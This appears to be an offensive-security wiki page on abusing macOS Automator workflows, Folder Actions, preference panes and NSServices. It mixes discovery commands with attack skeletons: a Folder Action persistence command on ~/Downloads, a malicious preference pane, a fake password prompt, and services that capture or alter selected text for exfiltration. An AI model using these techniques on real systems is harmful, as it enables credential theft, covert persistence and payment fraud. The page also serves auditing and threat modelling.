# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** is macOS's visual automation tool. It executes **workflows** (`.workflow` bundles) composed of **actions** (`.action` bundles). Automator also powers **Folder Actions**, **Quick Actions**, and **Shortcuts** integration. On modern macOS, workflows can also be **imported into Shortcuts**, so the same malicious logic may show up as a Finder Quick Action, a user service under `~/Library/Services/`, or a shortcut backed by legacy Automator actions.

Automator actions are **plugins** loaded into the Automator runtime when a workflow executes. They can:
- Execute arbitrary shell scripts
- Process files and data
- Interact with applications via AppleScript
- Chain together for complex automation

### Why This Matters

> [!WARNING]
> Automator workflows can be **social-engineered** into execution — they appear as simple document files. A `.workflow` bundle can contain embedded shell commands that execute when the workflow runs. Combined with Folder Actions, they provide **automatic persistence** that triggers on file events. Recent Gatekeeper fixes also showed that **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) must be treated as executable content, not harmless data.

### Discovery

```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id  
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```

### Attack: Social-Engineered Workflow

A `.workflow` bundle looks like a normal document file to most users:

```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>AMApplicationBuild</key>
    <string>523</string>
    <key>AMApplicationVersion</key>
    <string>2.10</string>
    <key>actions</key>
    <array>
        <dict>
            <key>action</key>
            <dict>
                <key>AMActionVersion</key>
                <string>2.0.3</string>
                <key>AMApplication</key>
                <array>
                    <string>Automator</string>
                </array>
                <key>AMBundleID</key>
                <string>com.apple.RunShellScript</string>
            </dict>
        </dict>
    </array>
</dict>
</plist>
PLIST
```

### Attack: Folder Action Persistence

Folder Actions automatically execute a workflow when files are added to a monitored folder:

```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
    make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
    tell folder action "Downloads"
        make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
    end tell
    set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```

> [!CAUTION]
> Folder Actions persist across reboots and execute silently. A Folder Action on `~/Downloads` means **every downloaded file triggers your payload** — including files from Safari, Chrome, AirDrop, and email attachments. Also note that `System Events` can register Folder Actions that point to scripts outside the default `~/Library/Scripts/Folder Action Scripts` locations, which makes loose-path hunting worthwhile. For related TCC implications, check [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) are plugins loaded from **System Settings** (formerly System Preferences). They provide configuration UI panels for system or third-party features. On older systems they were loaded directly by `System Preferences`; on newer releases third-party panes are commonly brokered by a **legacy loader XPC service** started from System Settings.

### Why This Matters

- Preference panes execute in a **trusted host process** spawned by System Settings / System Preferences
- On modern systems that host may be a **`legacyLoader` XPC service**, so the important boundary is still **trusted Apple UI process -> third-party code loading**
- Third-party preference panes inherit the **host process security context** and user trust attached to that UI
- Users install preference panes by **double-clicking** them — easy social engineering
- Once installed, they **persist** and load every time System Settings opens to that panel

### Discovery

```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```

### Attack: Privilege Context Hijacking

A malicious preference pane inherits the **pane host's** security context (historically `System Preferences`, on newer versions often a `legacyLoader` helper launched by `System Settings`):

```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
    [super mainViewDidLoad];
    // This code runs inside the preference-pane host process
    // It inherits that host's permissions / trust relationship
    
    // Example: read files accessible to System Settings
    NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];
    
    // Example: use Accessibility API if System Settings has it
    AXUIElementRef systemWide = AXUIElementCreateSystemWide();
    // ... control other applications
}
@end
```

### Attack: Persistence via Installation

```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```

### Attack: UI Phishing

A preference pane can mimic legitimate system UI panels to **phish for credentials**:

```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```

---

## NSServices

### Basic Information

**NSServices** allow applications to provide functionality to other apps through the **Services menu** (right-click → Services). When a user selects text or data and invokes a service, the selected data is **sent to the service provider** for processing.

Services are declared in an application's `Info.plist` under the `NSServices` key and registered with the pasteboard server (`pbs`). macOS also keeps a **service cache** and a **restriction policy** that decide which services are visible and whether sandboxed callers should receive an extra warning.

### Why This Matters

- Services receive **cross-application data flow** — selected text from any application is sent to the service
- A malicious service captures data from password managers, email clients, financial apps
- Services can **return modified data** to the calling application (man-in-the-middle on selection operations)
- Service names can be crafted to appear legitimate ("Format Text", "Encrypt Selection", "Share")
- The optional `NSRestricted` flag is security-relevant: a service marked unrestricted may be callable by a sandboxed app without the warning macOS shows for escape-prone services

### Discovery

```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```

### Attack: Data Interception Service

```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
    <dict>
        <key>NSMessage</key>
        <string>processSelection</string>
        <key>NSPortName</key>
        <string>EvilService</string>
        <key>NSSendTypes</key>
        <array>
            <string>NSStringPboardType</string>
        </array>
        <key>NSMenuItem</key>
        <dict>
            <key>default</key>
            <string>Format Selected Text</string>
        </dict>
    </dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
               userData:(NSString *)userData
                  error:(NSString **)error {
    NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];
    
    // selectedText contains whatever the user selected in any app
    // Could be a password, credit card number, private message, etc.
    
    // Exfiltrate the captured data
    [self sendToC2:selectedText];
    
    // Optionally return the text unchanged so user doesn't notice
    [pboard clearContents];
    [pboard setString:selectedText forType:NSPasteboardTypeString];
}
```

### Attack: Data Modification (Man-in-the-Middle)

A service can **modify the returned data** while appearing to provide a legitimate function:

```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
             userData:(NSString *)userData
                error:(NSString **)error {
    NSString *original = [pboard stringForType:NSPasteboardTypeString];
    
    // Log the original data (credential capture)
    [self exfiltrate:original];
    
    // Return modified data (e.g., replace bank account in a wire transfer)
    NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
                                                            withString:@"attacker-account"];
    [pboard clearContents];
    [pboard setString:modified forType:NSPasteboardTypeString];
}
```

### Restricted Services & Modern Abuse

Apple supports an optional `NSRestricted` boolean per service definition. If it is set, macOS warns sandboxed callers because the service may help them **escape sandbox or privacy boundaries**. From an offensive perspective, this gives two useful audit paths:

- Look for **third-party services not marked as restricted** even though they proxy Apple Events, file access, or other privileged actions
- Look for **high-value built-in services** with strong entitlements (for example, services exposed by Script Editor or Finder-backed helpers) and check whether user interaction is enough to turn them into a data-access primitive

A good recent example is **CVE-2022-48574**, where the Services mechanism could be abused to reach **TCC-protected user files without the expected confirmation flow**. The bug is fixed, but the technique remains useful for threat modeling: any service that forwards file access or automation requests on behalf of the caller deserves the same scrutiny.

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple fixed a Gatekeeper bypass in 2024 where an app-bundled Automator Quick Action could run without normal assessment. When auditing apps, inspect `Contents/PlugIns/*.workflow/Contents/document.wflow` exactly like you would inspect helper scripts or login items. See [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts can inherit legacy Automator behavior**: Apple also added an additional user-consent prompt after third-party shortcuts were found using a **legacy Automator action** to send Apple Events without the expected permission flow. Imported workflows and shortcut bundles should be reviewed for `Run AppleScript`, `Run Shell Script`, and similar bridge actions. See [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: Apple shipped another Automator fix in 2025 for access to protected user data. Even if Automator is a legacy surface, treat any workflow runner, Quick Action host, or automation bridge as a current attack surface rather than dead code.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting

```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```

### Preference Pane → TCC Escalation

```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```

### NSService → Password Manager Theft

```
1. Register a service named "Secure Copy" 
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```

## References

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
